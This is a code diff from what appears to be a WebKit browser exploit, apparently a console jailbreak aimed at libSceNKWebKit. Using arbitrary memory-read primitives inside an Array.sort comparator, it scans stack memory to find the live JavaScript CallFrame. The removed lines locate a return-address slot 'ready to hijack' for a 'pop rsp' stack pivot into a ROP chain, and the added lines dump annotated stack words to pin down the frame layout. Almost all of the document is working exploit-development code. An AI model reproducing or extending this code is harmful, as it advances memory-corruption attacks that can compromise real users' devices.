@@ -255,35 +255,28 @@ async function prepare(p) {
             + stacks.map(x => "0x" + x[1].toString(16)).join(","));
 
         const M0 = 0x13370001, M1 = 0x13370002;
+        const TAG = 0xffff0000;
         let comparatorAddr = null;
-        const frames = [];      // CallFrames whose callee is our comparator
+        let dump = null;
 
         const comparator = function (a, b) {
-            if (frames.length) return 0;
-            // Locate the comparator's own CallFrame by its callee slot: scan for
-            // a qword == comparatorAddr, then a WebKit-text returnPC must sit at
-            // callee-0x10 (callee is CallFrame+0x18, returnPC is CallFrame+0x08).
-            const lo = comparatorAddr.low >>> 0, hi = comparatorAddr.hi >>> 0;
-            const b0 = lo & 0xff, b1 = (lo >>> 8) & 0xff,
-                  b2 = (lo >>> 16) & 0xff, b3 = (lo >>> 24) & 0xff;
+            if (dump) return 0;
+            // Find M0 on any stack, then dump a window of qwords around it with
+            // annotations so the real CallFrame layout is readable directly.
             for (const [base, size] of stacks) {
                 const view = array_from_address(base, size);
-                for (let o = 0; o + 8 <= size; o += 8) {
-                    if (view[o] !== b0 || view[o + 1] !== b1
-                        || view[o + 2] !== b2 || view[o + 3] !== b3) continue;
-                    const slot = base.add32(o);
-                    const full = p.read8(slot);
-                    if (full.low !== lo || (full.hi >>> 0) !== hi) continue;   // exact callee
-                    if (o < 0x10) continue;
-                    const retPC = p.read8(base.add32(o - 0x10));               // CallFrame+0x08
-                    const rva = retPC.sub32(libSceNKWebKitBase);
-                    const inWk = rva.hi === 0 && (rva.low >>> 0) < 0x3673d22
-                        && (rva.low >>> 0) > 0x1000;
-                    frames.push({ base, o, calleeSlot: slot, retPC,
-                        retSlot: base.add32(o - 0x10),      // CallFrame+0x08
-                        cbSlot: base.add32(o - 0x08),       // CallFrame+0x10
-                        rva: rva.low >>> 0, inWk });
-                    if (frames.length >= 8) return 0;
+                for (let o = 0x40; o + 0x40 <= size; o += 8) {
+                    if (view[o] !== 0x01 || view[o + 1] !== 0x00
+                        || view[o + 2] !== 0x37 || view[o + 3] !== 0x13) continue;
+                    const full = p.read8(base.add32(o));
+                    if ((full.hi >>> 0) !== TAG || (full.low >>> 0) !== (M0 >>> 0)) continue;
+                    const rows = [];
+                    for (let d = -0x40; d <= 0x40; d += 8) {
+                        const v = p.read8(base.add32(o + d));
+                        rows.push([d, v]);
+                    }
+                    dump = { base, o, rows };
+                    return 0;
                 }
             }
             return 0;
@@ -295,41 +288,29 @@ async function prepare(p) {
         const arr = [M0, M1];
         arr.sort(comparator);
 
-        jbmark("SELF-FRAMES", "callee-slots-found=" + frames.length);
-        // The comparator is called from C++ (sort) via the VM entry, so its
-        // returnPC is a VM-entry trampoline, NOT WebKit .text -- that is fine,
-        // the pivot works regardless. Identify the REAL live CallFrame by its
-        // ARGUMENTS: callee at CallFrame+0x18 means arg0 is at +0x18 and arg1 at
-        // +0x20 from the callee slot, and they must be our two boxed markers.
-        const TAG = 0xffff0000;
-        function isMarker(v, m) { return (v.hi >>> 0) === TAG && (v.low >>> 0) === (m >>> 0); }
-        let good = null;
-        for (let n = 0; n < frames.length; n++) {
-            const f = frames[n];
-            const argCount = p.read8(f.calleeSlot.add32(0x08));
-            const arg0 = p.read8(f.calleeSlot.add32(0x18));
-            const arg1 = p.read8(f.calleeSlot.add32(0x20));
-            const markerFrame =
-                (isMarker(arg0, M0) && isMarker(arg1, M1)) ||
-                (isMarker(arg0, M1) && isMarker(arg1, M0));
-            jbmark("SELF-FRAME", "#" + n + "-stack=0x" + f.base.toString()
-                + "-off=0x" + f.o.toString(16)
-                + "-returnPC=0x" + f.retPC.toString()
-                + "-argc=0x" + argCount.toString()
-                + "-arg0=0x" + arg0.toString() + "-arg1=0x" + arg1.toString()
-                + "-MARKERFRAME=" + markerFrame);
-            if (markerFrame && !good) good = f;
+        if (!dump)
+            throw new Error("selfstack: M0 not found for the window dump");
+        const cLo = comparatorAddr.low >>> 0, cHi = comparatorAddr.hi >>> 0;
+        function annotate(v) {
+            if ((v.hi >>> 0) === TAG && (v.low >>> 0) === (M0 >>> 0)) return "<M0(arg)";
+            if ((v.hi >>> 0) === TAG && (v.low >>> 0) === (M1 >>> 0)) return "<M1(arg)";
+            if (v.low === cLo && (v.hi >>> 0) === cHi) return "<COMPARATOR(callee)";
+            const wk = v.sub32(libSceNKWebKitBase);
+            if (wk.hi === 0 && (wk.low >>> 0) < 0x3673d22 && (wk.low >>> 0) > 0x1000)
+                return "<wk+0x" + (wk.low >>> 0).toString(16) + "(code?)";
+            if ((v.hi >>> 0) >= 0x7 && (v.hi >>> 0) <= 0x9 && (v.low & 7) === 0)
+                return "<stackptr?";
+            if ((v.hi >>> 0) >= 0x8 && (v.hi >>> 0) <= 0x8ff) return "<heap/module?";
+            return "";
         }
-        if (!good)
-            throw new Error("selfstack: " + frames.length + " callee refs but none "
-                + "carried our markers as args -- the comparator frame layout "
-                + "differs; inspect the SELF-FRAME dumps.");
-        jbmark("SELF-LOCATE-OK", "comparator CallFrame VERIFIED by its args; "
-            + "returnPC (trampoline) at retSlot=0x" + good.retSlot.toString()
-            + "-cbSlot=0x" + good.cbSlot.toString()
-            + " -- overwrite retSlot=pop rsp, cbSlot=chain_entry to pivot");
-        throw new Error("selfstack locate OK: comparator CallFrame verified; "
-            + "ret slot 0x" + good.retSlot.toString() + " ready to hijack.");
+        jbmark("SELF-DUMP-AT", "stack=0x" + dump.base.toString()
+            + "-M0off=0x" + dump.o.toString(16));
+        for (const [d, v] of dump.rows) {
+            const sign = d < 0 ? "-0x" + (-d).toString(16) : "+0x" + d.toString(16);
+            jbmark("SELF-Q", "M0" + sign + " = 0x" + v.toString() + " " + annotate(v));
+        }
+        throw new Error("selfstack window dump complete -- read the SELF-Q lines "
+            + "to place callee/returnPC/args and derive the exact CallFrame.");
     }
 
     // -----------------------------------------------------------------------
